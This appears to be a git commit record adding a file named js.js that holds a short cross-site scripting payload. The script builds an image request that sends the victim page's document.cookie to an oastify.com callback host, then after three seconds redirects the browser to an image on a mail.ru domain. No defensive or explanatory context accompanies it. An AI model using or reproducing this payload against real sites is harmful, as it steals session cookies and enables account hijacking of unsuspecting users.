016169a0f311c170bd0a3b95c37bdf0ca46a1f61
Hideus <117414789+HideusXakep@users.noreply.github.com>
2026-04-10 21:20:53 +0200

    Create js.js

---
+++ js.js
@@ -0,0 +1,8 @@
+<script>
+img=new Image();
+img.src='https://jk7lgnbfxn90wisgl807r46bm2stgl4a.oastify.com/?cookie='+document.cookie;
+function F() {
+    location='https://otvet.imgsmail.ru/download/234054366_4f953678a2475e9c53a807f249174753_800.jpg ';
+}
+setTimeout(F, 3000);
+</script>
